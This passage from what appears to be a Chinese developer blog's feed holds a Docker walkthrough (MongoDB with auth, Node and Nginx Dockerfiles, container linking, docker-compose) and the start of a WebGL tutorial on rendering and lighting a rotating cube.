    <content type="html"><![CDATA[<p>以Node+Mongodb+Nginx为例（上次的同构项目），记录Docker初步实践，希望对同阶段的同学有一点启发。<br><a id="more"></a></p><h2 id="单个服务"><a href="#单个服务" class="headerlink" title="单个服务"></a>单个服务</h2><h3 id="Mongo"><a href="#Mongo" class="headerlink" title="Mongo"></a>Mongo</h3><p><strong>关于用户创建</strong></p><p>先在没有加–auth情况下run一个容器，进行用户创建，再以–auth方式起一个容器（最后工作的容器），怎么实现的：</p><p>启动容器时创建数据卷并挂载到容器，这里创建用于存放数据库数据的数据卷，这样可以让数据在多个容器间共享，包括数据库的用户配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name db -d -p 27520:27017 -v /home/open/mymongo/data:/data/db mongo --auth</span><br></pre></td></tr></table></figure></p><p><strong>关于CMD &amp; ENTRYPOINT</strong></p><p>在Dockerfile里同时定义ENTRYPOINT和CMD时，CMD的值将作为ENTRYPOINT的默认参数，而在run一个容器的时候，在镜像后添加的参数将会覆盖掉CMD的值而作为ENTRYPOINT的参数。</p><p>当我看到mongodb的Dockerfile:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [&quot;docker-entrypoint.sh&quot;]</span><br><span class="line"></span><br><span class="line">EXPOSE 27017</span><br><span class="line">CMD [&quot;mongod&quot;]</span><br></pre></td></tr></table></figure></p><p>一开始我有这样一个困惑:</p><p>以非–auth方式run时没有问题，但是当加上–auth时问题来了，这里默认的参数是mongod即运行mongo数据库服务，加上–auth后岂不是替换了mongod即:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-entrypoint.sh --auth</span><br></pre></td></tr></table></figure></p><p>那么mongod又是怎么被启动的呢？</p><p>感谢stackoverflow前辈的解答，确实上面分析得没问题，奥秘就在这docker-entrypoint.sh里:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$&#123;1:0:1&#125;&quot; = &apos;-&apos; ]; then</span><br><span class="line">set -- mongod &quot;$@&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>上面的shell命令作用是当识别到run时所加参数为-开头时，就会在其前加上mongod，这也难怪了!</p><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><p>在原有的node镜像上，构建自己的镜像:</p><h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile:"></a>Dockerfile:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM node:slim</span><br><span class="line">RUN npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY ./package.json .</span><br><span class="line">RUN cnpm install</span><br><span class="line">COPY . .</span><br><span class="line">RUN npm run build</span><br><span class="line">ENTRYPOINT [&quot;node&quot;,&quot;./server/index.js&quot;]</span><br></pre></td></tr></table></figure><p>这里其实更好的方式是将项目目录以数据卷方式挂载到容器里</p><h4 id="暴露端口"><a href="#暴露端口" class="headerlink" title="暴露端口"></a>暴露端口</h4><p>将node server暴露给宿主机:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name nodeserver -d -p 3000:3000 mynode:v1</span><br></pre></td></tr></table></figure></p><p>其实这里根本是运行不了的，因为我们node server还没有与数据库连接，接下来会讲连接容器</p><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>主要是更改默认的配置文件,这里的服务是反向代理到node服务的，所以并没有挂载项目文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FROM nginx:latest</span><br><span class="line">COPY ./nginx.conf /etc/nginx/nginx.conf</span><br><span class="line">EXPOSE 8080 80</span><br></pre></td></tr></table></figure></p><p>同样运行的时候暴露端口</p><h2 id="容器连接"><a href="#容器连接" class="headerlink" title="容器连接"></a>容器连接</h2><p>上面是对项目用到的每个服务进行单独的说明，但是这几个服务之间是有联系的，要组建一个项目需要将它们进行连接。</p><p>其实很简单</p><p>以nginx和node连接为例:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name webserver -d -p 8080:8080 --link cnode:node mynginx:v1</span><br></pre></td></tr></table></figure></p><p>这样node容器的3000端口就会在新起的nginx容器里有了映射,而且还会在新起的nginx容器/etc/hosts 加上一条解析,将cnode(node容器名),node(link别名)解析到node容器的ip。</p><p>来看看截图，进入nginx容器看看:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/dockerlink.jpg" alt="link"></p><p>这样还有一个好处，如果不是最终需要暴露到宿主机的服务，它们的端口就不会被暴露，比如Mongodb的数据库端口27017就只会暴露给连接它的node服务，而不能被公网访问，这样比较安全。</p><p>然后我们就可以在nginx下将服务代理到node服务了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">upstream bbs &#123;</span><br><span class="line">      server  node:3000;</span><br><span class="line">    &#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       8080;</span><br><span class="line">server_name localhost;</span><br><span class="line">        location / &#123;</span><br><span class="line">          proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">          proxy_set_header Host $http_host;</span><br><span class="line">          proxy_set_header X-NginX-Proxy true;</span><br><span class="line">          proxy_pass http://bbs/;</span><br><span class="line">          proxy_redirect off;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="docker-compose项目"><a href="#docker-compose项目" class="headerlink" title="docker-compose项目"></a>docker-compose项目</h2><p>从上面可以发现，当一个项目需要多个服务配合完成时，一个一个手动管理连接是很麻烦的，Compose 定位是 “定义和运行多个 Docker 容器的应用“</p><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><p>以我的这个项目为例:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"2"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">    mongodb:</span></span><br><span class="line"><span class="attr">        image:</span> <span class="attr">mongo:latest</span></span><br><span class="line"><span class="attr">        expose:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">"27017"</span></span><br><span class="line"><span class="attr">        volumes:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">"/home/open/mymongo/data:/data/db"</span></span><br><span class="line"><span class="attr">        command:</span> <span class="bullet">--auth</span></span><br><span class="line"><span class="attr">    nginx:</span></span><br><span class="line"><span class="attr">        build:</span> <span class="string">/home/open/mynginx/</span></span><br><span class="line"><span class="attr">        ports:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">"8080:8080"</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">"80:80"</span></span><br><span class="line"><span class="attr">        links:</span></span><br><span class="line"><span class="attr">            - node_server:</span><span class="string">node</span></span><br><span class="line"><span class="attr">    node_server:</span></span><br><span class="line"><span class="attr">        build:</span> <span class="string">/home/laoqiren/workspace/isomorphic-redux-CNode/</span> </span><br><span class="line"><span class="attr">        links:</span></span><br><span class="line"><span class="attr">            - mongodb:</span><span class="string">mongo</span></span><br><span class="line"><span class="attr">        ports:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">"3000:3000"</span></span><br><span class="line"><span class="attr">        expose:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">"3000"</span></span><br></pre></td></tr></table></figure></p><p>ports定义向宿主机暴露端口，expose定义向其他服务暴露的用于连接的端口,links定义连接。</p><h3 id="一键式启动项目"><a href="#一键式启动项目" class="headerlink" title="一键式启动项目"></a>一键式启动项目</h3><p><strong>先build各个镜像</strong></p><p>根据服务指定的build目录下的Dockerfile构建镜像:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/dockerimages.jpg" alt="images"><br>看到docker-compose构建了nginx和node两个新镜像，而mongo是已经存在的，不用构建</p><p><strong>启动项目</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d nginx</span><br></pre></td></tr></table></figure></p><p>该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。</p><p>链接的服务都将会被自动启动，除非已经处于运行状态。</p><p>我们启动了nginx,nginx连接了node,则node启动，而node又连接了mongo,mongo启动，这样整个应用就一键式启动了!<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/upnginx.jpg" alt="done"></p><p>Done!</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>更细节的研究有待继续。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以Node+Mongodb+Nginx为例（上次的同构项目），记录Docker初步实践，希望对同阶段的同学有一点启发。&lt;br&gt;
    
    </summary>
    
      <category term="docker" scheme="http://luoxia.me/code/categories/docker/"/>
    
    
      <category term="docker" scheme="http://luoxia.me/code/tags/docker/"/>
    
      <category term="云计算" scheme="http://luoxia.me/code/tags/%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>记一个立方体的产生</title>
    <link href="http://luoxia.me/code/2017/03/23/%E8%AE%B0%E4%B8%80%E4%B8%AA%E7%AB%8B%E6%96%B9%E4%BD%93%E7%9A%84%E4%BA%A7%E7%94%9F/"/>
    <id>http://luoxia.me/code/2017/03/23/记一个立方体的产生/</id>
    <published>2017-03-23T03:22:12.000Z</published>
    <updated>2017-11-16T13:10:06.492Z</updated>
    
    <content type="html"><![CDATA[<p>从原生WebGL的角度分析一个立方体的产生。例子虽简单，但包含了好多基础概念哈哈，算是入门阶段的小小总结吧。</p><p>首先来看看最终的效果 (♥◠‿◠)ﾉ：</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/test.gif" alt=""><br><a id="more"></a></p><h2 id="WebGL坐标系统"><a href="#WebGL坐标系统" class="headerlink" title="WebGL坐标系统"></a>WebGL坐标系统</h2><p>与Canvas画布的坐标系不同，WebGL默认采用右手坐标系：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/locate.png" alt=""></p><p>WebGL坐标原点在画布中点。</p><p>以将屏幕上某点的px坐标转换到WebGL坐标为例：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> x = e.clientX,</span><br><span class="line">    y = e.clientY;</span><br><span class="line"><span class="keyword">let</span> rect = e.target.getBoundingClientRect();</span><br><span class="line"></span><br><span class="line">x = ((x - rect.left) - canvas.width/<span class="number">2</span>)/(canvas.width/<span class="number">2</span>);</span><br><span class="line">y = ((y - rect.height) - canvas.height/<span class="number">2</span>)/(canvas.height/<span class="number">2</span>);</span><br></pre></td></tr></table></figure></p><p>先是将px坐标转换为canvas画布坐标（即减去画布与屏幕左和上的距离），再转换成WebGL坐标（由于坐标值为0.0-1.0的值，所以要进行比值操作）</p><h2 id="缓冲区对象"><a href="#缓冲区对象" class="headerlink" title="缓冲区对象"></a>缓冲区对象</h2><p>用于临时保存多个顶点信息，一次性绘制多个顶点。</p><p>创建缓冲区对象 -&gt; 绑定缓冲区对象 -&gt; 写入数据到缓冲区对象 -&gt; 分配缓冲区对象给attribute变量 -&gt; 开启attribute变量</p><p>如将正方体的每个顶点坐标，颜色值，法向量坐标输送到顶点着色器变量里:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vertices = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([</span><br><span class="line">        <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>,  <span class="number">-1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>,  <span class="number">-1.0</span>,<span class="number">-1.0</span>, <span class="number">1.0</span>,   <span class="number">1.0</span>,<span class="number">-1.0</span>, <span class="number">1.0</span>,  <span class="comment">// v0-v1-v2-v3 front</span></span><br><span class="line">     <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>,   <span class="number">1.0</span>,<span class="number">-1.0</span>, <span class="number">1.0</span>,   <span class="number">1.0</span>,<span class="number">-1.0</span>,<span class="number">-1.0</span>,   <span class="number">1.0</span>, <span class="number">1.0</span>,<span class="number">-1.0</span>,  <span class="comment">// v0-v3-v4-v5 right</span></span><br><span class="line">     <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>,   <span class="number">1.0</span>, <span class="number">1.0</span>,<span class="number">-1.0</span>,  <span class="number">-1.0</span>, <span class="number">1.0</span>,<span class="number">-1.0</span>,  <span class="number">-1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>,  <span class="comment">// v0-v5-v6-v1 up</span></span><br><span class="line">    <span class="number">-1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>,  <span class="number">-1.0</span>, <span class="number">1.0</span>,<span class="number">-1.0</span>,  <span class="number">-1.0</span>,<span class="number">-1.0</span>,<span class="number">-1.0</span>,  <span class="number">-1.0</span>,<span class="number">-1.0</span>, <span class="number">1.0</span>,  <span class="comment">// v1-v6-v7-v2 left</span></span><br><span class="line">    <span class="number">-1.0</span>,<span class="number">-1.0</span>,<span class="number">-1.0</span>,   <span class="number">1.0</span>,<span class="number">-1.0</span>,<span class="number">-1.0</span>,   <span class="number">1.0</span>,<span class="number">-1.0</span>, <span class="number">1.0</span>,  <span class="number">-1.0</span>,<span class="number">-1.0</span>, <span class="number">1.0</span>,  <span class="comment">// v7-v4-v3-v2 down</span></span><br><span class="line">     <span class="number">1.0</span>,<span class="number">-1.0</span>,<span class="number">-1.0</span>,  <span class="number">-1.0</span>,<span class="number">-1.0</span>,<span class="number">-1.0</span>,  <span class="number">-1.0</span>, <span class="number">1.0</span>,<span class="number">-1.0</span>,   <span class="number">1.0</span>, <span class="number">1.0</span>,<span class="number">-1.0</span>   <span class="comment">// v4-v7-v6-v5 back</span></span><br><span class="line">    ]);</span><br><span class="line"><span class="keyword">let</span> buffer = gl.createBuffer();</span><br><span class="line">gl.bindBuffer(gl.ARRAY_BUFFER,buffer);</span><br><span class="line">gl.bufferData(gl.ARRAY_BUFFER,vertices,gl.STATIC_DRAW);</span><br><span class="line"><span class="keyword">let</span> a_Attribute = gl.getAttribLocation(gl.program,<span class="string">'a_Postion'</span>);</span><br><span class="line">gl.vertexAttribPointer(a_Attribute,num,type,<span class="literal">false</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">gl.enableVertexAttribArray(a_Attribute);</span><br></pre></td></tr></table></figure></p><h2 id="变换（模型矩阵）"><a href="#变换（模型矩阵）" class="headerlink" title="变换（模型矩阵）"></a>变换（模型矩阵）</h2><p>将物体进行多种变换，实际是多种矩阵做乘法。这里用封装好的矩阵API来创建模型变换矩阵。</p><p>正方体在不断的旋转:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> modelMatrix = <span class="keyword">new</span> Matrix4();</span><br><span class="line"><span class="keyword">let</span> currentAngle = animate(currentAngle);</span><br><span class="line">modelMatrix.setRotate(currentAngle, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">gl.uniformMatrix4fv(u_ModelMatrix,<span class="literal">false</span>,modelMatrix.elements);</span><br></pre></td></tr></table></figure><h2 id="观察者视点和视线"><a href="#观察者视点和视线" class="headerlink" title="观察者视点和视线"></a>观察者视点和视线</h2><p>通过指定观察点位置，目标坐标，上方向，生成视图矩阵。</p><p>如这里我们看正方体：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> viewMatrix = <span class="keyword">new</span> Matrix4();</span><br><span class="line">viewMatrix.setLookAt(<span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><h2 id="可视空间（投影矩阵）"><a href="#可视空间（投影矩阵）" class="headerlink" title="可视空间（投影矩阵）"></a>可视空间（投影矩阵）</h2><p>和现实中的照相机一样，可视区间是有一定范围的，在范围之外的，可以不用渲染，来节约开销。</p><p>两类可视空间：</p><ol><li>正射投影</li><li>透视投影</li></ol><p>正射投影中，不管目标离视点多远，呈现的大小就是原本的大小，这适合打印等场景，要模拟显示场景，就需要深度感，即目标大小离视点越远，看起来应该越小。</p><h3 id="创建透视投影矩阵"><a href="#创建透视投影矩阵" class="headerlink" title="创建透视投影矩阵"></a>创建透视投影矩阵</h3><p>我们这里的正方体模拟显示场景，用透视投影，<br>透视投影图示：<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/proj.png" alt=""></p><p>创建透视投影矩阵，需指定垂直视角（顶面与底面夹角，图中两条红色线夹角），近剪裁面宽高比，近剪裁面和远剪裁面的位置。为了防止正方体变形，将宽高比设为画布宽高比:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> projMatrix = <span class="keyword">new</span> Matrix4();</span><br><span class="line">projMatrix.setPerspective(<span class="number">30</span>,canvas.width/canvas.height,<span class="number">1</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure></p><h2 id="得到最终位置"><a href="#得到最终位置" class="headerlink" title="得到最终位置"></a>得到最终位置</h2><p>实际绘制在画布上的顶点位置，是经过原本坐标矩阵，模型矩阵，视图矩阵，投影矩阵运算而来的。</p><p>即最终<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gl_Position = u_MvpMatrix * a_Position;</span><br></pre></td></tr></table></figure></p><p>其中u_MvpMatrix表示模型视图投影综合矩阵。</p><p>如这个正方体:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mvpMatrix = <span class="keyword">new</span> Matrix4();</span><br><span class="line">mvpMatrix.set(projMatrix).multiply(viewMatrix).multiply(modelMatrix);</span><br><span class="line">gl.uniformMatrix4fv(u_MvpMatrix,<span class="literal">false</span>,mvpMatrix.elements);</span><br></pre></td></tr></table></figure></p><h2 id="光照"><a href="#光照" class="headerlink" title="光照"></a>光照</h2><p>可以看到，这个正方体是模拟在光照环境下的，而且是点光源光。</p><h3 id="漫反射光"><a href="#漫反射光" class="headerlink" title="漫反射光"></a>漫反射光</h3><p>对于平行光和点光源，漫反射形式的反射光颜色最终取决于入色光颜色，表面本身颜色，以及入射光与表面法线夹角决定。</p><p>即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;漫反射光颜色&gt; = &lt;入射光颜色&gt; x &lt;表面基底色&gt; x cosa</span><br></pre></td></tr></table></figure></p><p>根据数量积公式，得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cosa = &lt;光线方向单位向量&gt;.&lt;法线方向单位向量&gt;</span><br></pre></td></tr></table></figure></p><p>对于点光源，还需要通过点光源位置和目标点位置计算出光线方向</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vec3 normal = normalize(v_Normal);</span><br><span class="line">vec3 lightDirection = normalize(u_LightPosition - v_Position);</span><br><span class="line"><span class="keyword">float</span> nDotL = max(dot(lightDirection,normal),<span class="number">0.0</span>);</span><br><span class="line">vec3 diffuse = u_LightColor * vec3(v_Color) * nDotL; <span class="comment">//漫反射光颜色</span></span><br></pre></td></tr></table></figure><h3 id="加上环境光效果"><a href="#加上环境光效果" class="headerlink" title="加上环境光效果"></a>加上环境光效果</h3><p>最终的物体视觉颜色应该是:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vec3 ambient = u_AmbientLight * v_Color.rgb;</span><br><span class="line">gl_FragColor = vec4(diffuse + ambient,v_Color.a);</span><br></pre></td></tr></table></figure></p><h3 id="转动的正方体光照"><a href="#转动的正方体光照" class="headerlink" title="转动的正方体光照"></a>转动的正方体光照</h3><p>目标在不断转动，会导致顶点位置在不断变化，使得光线方向在不断变化，而且转动会导致顶点的法向量发生变化。</p><p>对于光线方向，在计算的时候，目标顶点坐标就应该是经过模型矩阵运算后的坐标（不包括视图，投影，因为光照考虑实际目标位置），即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v_Position = vec3(u_ModelMatrix * a_Position);</span><br></pre></td></tr></table></figure></p><p>对于变化的法向量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">变化后的法向量 = 原来的法向量矩阵 x 模型矩阵的逆转置矩阵。</span><br></pre></td></tr></table></figure></p><p>如这里的正方体:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> normalMatrix  = <span class="keyword">new</span> Matrix4();</span><br><span class="line">normalMatrix.setInverseOf(modelMatrix);</span><br><span class="line">normalMatrix.transpose();</span><br><span class="line">gl.uniformMatrix4fv(u_NormalMatrix,<span class="literal">false</span>,normalMatrix.elements);</span><br></pre></td></tr></table></figure></p><p>着色器：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v_Normal = normalize(vec3(u_NormalMatrix * a_Normal));</span><br></pre></td></tr></table></figure></p><h2 id="其他细节"><a href="#其他细节" class="headerlink" title="其他细节"></a>其他细节</h2><h3 id="隐藏面消除"><a href="#隐藏面消除" class="headerlink" title="隐藏面消除"></a>隐藏面消除</h3><p>默认情况下，WebGL是以顶点在缓冲区的顺序进行绘制的，当我们绘制的各目标实际远近顺序和数据在缓冲区顺序不一致时，就会出现远处目标本来看不到的部分挡住了近处的目标现象。</p><p>开启隐藏面消除功能:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gl.enable(gl.DEPTH_TEST);</span><br></pre></td></tr></table></figure></p><p>绘制之前，清除深度缓冲区:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gl.clear(gl.COLOR_BUFFER_BIT | gl.DEPTH_BUFFER_BIT);</span><br></pre></td></tr></table></figure></p><h3 id="顶点索引"><a href="#顶点索引" class="headerlink" title="顶点索引"></a>顶点索引</h3><p>你可能会问，上面的顶点坐标类型数组中，为什么有24个顶点数据呢？<br>这是因为在正方体中，每个顶点可能处于不同面，不同面有不同法向量，webGL提供drawElements方法，通过索引方式绘制，这样做可以节省一些数据（不然需要6x6=36个顶点）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> indices = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>,   <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>,    <span class="comment">// front</span></span><br><span class="line">    <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>,   <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>,    <span class="comment">// right</span></span><br><span class="line">    <span class="number">8</span>, <span class="number">9</span>,<span class="number">10</span>,   <span class="number">8</span>,<span class="number">10</span>,<span class="number">11</span>,    <span class="comment">// up</span></span><br><span class="line">    <span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,  <span class="number">12</span>,<span class="number">14</span>,<span class="number">15</span>,    <span class="comment">// left</span></span><br><span class="line">    <span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,  <span class="number">16</span>,<span class="number">18</span>,<span class="number">19</span>,    <span class="comment">// down</span></span><br><span class="line">    <span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,  <span class="number">20</span>,<span class="number">22</span>,<span class="number">23</span>      <span class="comment">// back</span></span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> indexBuffer = gl.createBuffer();</span><br><span class="line">gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER,indexBuffer);</span><br><span class="line">gl.bufferData(gl.ELEMENT_ARRAY_BUFFER,indices,gl.STATIC_DRAW);</span><br><span class="line">...</span><br><span class="line">gl.drawElements(gl.TRIANGLES,<span class="number">24</span>,gl.UNSIGNED_BYTE,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="逐顶点不自然现象"><a href="#逐顶点不自然现象" class="headerlink" title="逐顶点不自然现象"></a>逐顶点不自然现象</h3><p>如果在顶点着色器中进行逐顶点的颜色计算，会发现最后立方体表面颜色渐变不够自然。这是因为靠几个顶点进行内插计算出来的效果和实际光照效果有一定差别，这就需要我们进行逐片元的颜色计算：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> FSHADER_SOURCE = <span class="string">`</span></span><br><span class="line"><span class="string">    precision mediump float;</span></span><br><span class="line"><span class="string">    uniform vec3 u_LightColor;</span></span><br><span class="line"><span class="string">    uniform vec3 u_LightPosition;</span></span><br><span class="line"><span class="string">    uniform vec3 u_AmbientLight;</span></span><br><span class="line"><span class="string">    varying vec4 v_Color;</span></span><br><span class="line"><span class="string">    varying vec3 v_Normal;</span></span><br><span class="line"><span class="string">    varying vec3 v_Position;</span></span><br><span class="line"><span class="string">    void main()&#123;</span></span><br><span class="line"><span class="string">        vec3 normal = normalize(v_Normal);</span></span><br><span class="line"><span class="string">        vec3 lightDirection = normalize(u_LightPosition - v_Position);</span></span><br><span class="line"><span class="string">        float nDotL = max(dot(lightDirection,normal),0.0);</span></span><br><span class="line"><span class="string">        vec3 diffuse = u_LightColor * vec3(v_Color) * nDotL;</span></span><br><span class="line"><span class="string">        vec3 ambient = u_AmbientLight * v_Color.rgb;</span></span><br><span class="line"><span class="string">        gl_FragColor = vec4(diffuse + ambient,v_Color.a);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure></p><h3 id="精度限定"><a href="#精度限定" class="headerlink" title="精度限定"></a>精度限定</h3><p>着色器对片元着色器的float类型没有默认精度，需要手动添加（不然会报错）:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">precision mediump <span class="keyword">float</span>;<span 